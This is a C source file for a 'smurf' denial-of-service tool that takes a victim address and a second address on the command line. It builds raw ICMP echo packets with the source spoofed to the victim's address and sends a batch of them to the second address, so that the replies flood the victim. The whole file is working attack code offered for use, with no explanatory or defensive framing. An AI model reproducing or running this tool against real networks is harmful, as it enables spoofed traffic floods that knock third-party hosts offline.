#include "header.h"

#define MESSAGE_SIZE 17
#define PACKAGE_AMOUNT 40
#define TIME_INTERVAL 200	//ms

int main(int argc, char **argv)
{
	uint32_t victim_address, pseudo_attacker_address;
	SOCKET sock;
	int hdr_included = 1;

#ifdef WIN32
	WSADATA trash;
	if (WSAStartup(0x0202, &trash) == SOCKET_ERROR)
	{
		die("Cannot init winsock", -1);
	}
#endif

	setbuf(stdout, NULL);
	atexit((void(*)(void))cleanup);

	if (argc < 3)
	{
		die("params specified\nUse \"./smurf victim_address pseudo_attacker_address\"", -1);
	}

	if ((victim_address = inet_addr(argv[1])) == INADDR_NONE)
	{
		die("Invalid address", -1);
	}

	if ((pseudo_attacker_address = inet_addr(argv[2])) == INADDR_NONE)
	{
		die("Invalid subnet address", -1);
	}

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == SOCKET_ERROR)
	{
		die("Cannot socket()", -2);
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char*)&hdr_included, sizeof hdr_included) != 0)
	{
		die("Cannot setsockopt()", -2);
	}
	
	uint8_t *outPacket;
	struct icmphdr *header_icmp;
	struct iphdr *header_ip;
	struct sockaddr_in addr;
	uint32_t i;

	if ((outPacket = (uint8_t*)malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + MESSAGE_SIZE)) == NULL)
	{
		die("Cannot allocate memory", -1);
	}

	srand((unsigned int)time(NULL));
	for (i = 0; i < MESSAGE_SIZE + sizeof(struct icmphdr) + sizeof(struct iphdr); i++) outPacket[i] = rand() % 0xFF;

	header_ip = (struct iphdr*)outPacket;
	header_icmp = (struct icmphdr*)(outPacket+sizeof(struct iphdr));

	header_icmp->type = ICMP_ECHO;
	header_icmp->code = 0;
	header_icmp->checksum = 0;
	header_icmp->checksum = calculateChecksum(outPacket + sizeof(struct iphdr), sizeof(struct icmphdr) + MESSAGE_SIZE);

	header_ip->version = 4;
	header_ip->ihl = 5;
	header_ip->tos = 0;
	header_ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + MESSAGE_SIZE);
	header_ip->frag_off = 0;
	header_ip->ttl = 255;
	header_ip->protocol = IPPROTO_ICMP;
	header_ip->saddr = victim_address;
	header_ip->daddr = pseudo_attacker_address;
	header_ip->check = calculateChecksum(outPacket, sizeof(struct iphdr));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = pseudo_attacker_address;
	//
	for (i = 0; i < PACKAGE_AMOUNT; i++)
	{
		printf("ping from %s\n", inet_ntoa(*(struct in_addr*)&victim_address));
		if (sendto(sock, (const char *)outPacket, sizeof(struct iphdr) + sizeof(struct icmphdr) + MESSAGE_SIZE, 0, (const struct sockaddr*)&addr, sizeof addr) == SOCKET_ERROR)
			die("Cannot sendto()", -3);
		sleep(TIME_INTERVAL);
	}
	close(sock);

	return 0;
}

void die(char *reason, int code)
{
#ifdef WIN32
    fprintf(stderr, "winerr %d", GetLastError());
#elif __linux__
	fprintf(stderr, "%s, errno %d\n", reason, errno);
#endif
	exit(code);
}

uint16_t calculateChecksum(uint8_t *data, uint32_t len)
{
	uint32_t result = 0;
	uint16_t i;

	if (len & 1)
	{
		result = data[len - 1];
		len--;
	}

	for (i = 0; i < len; i += 2)
	{
		result += *(uint16_t*)(data + i);
		if (result & 0xFFFF0000)
		{
			result &= 0xFFFF;
			result++;
		}
	}

	return (uint16_t)((result & 0xFFFF) ^ 0xFFFF);
}

void cleanup()
{
#ifdef WIN32
	WSACleanup();
#endif
}
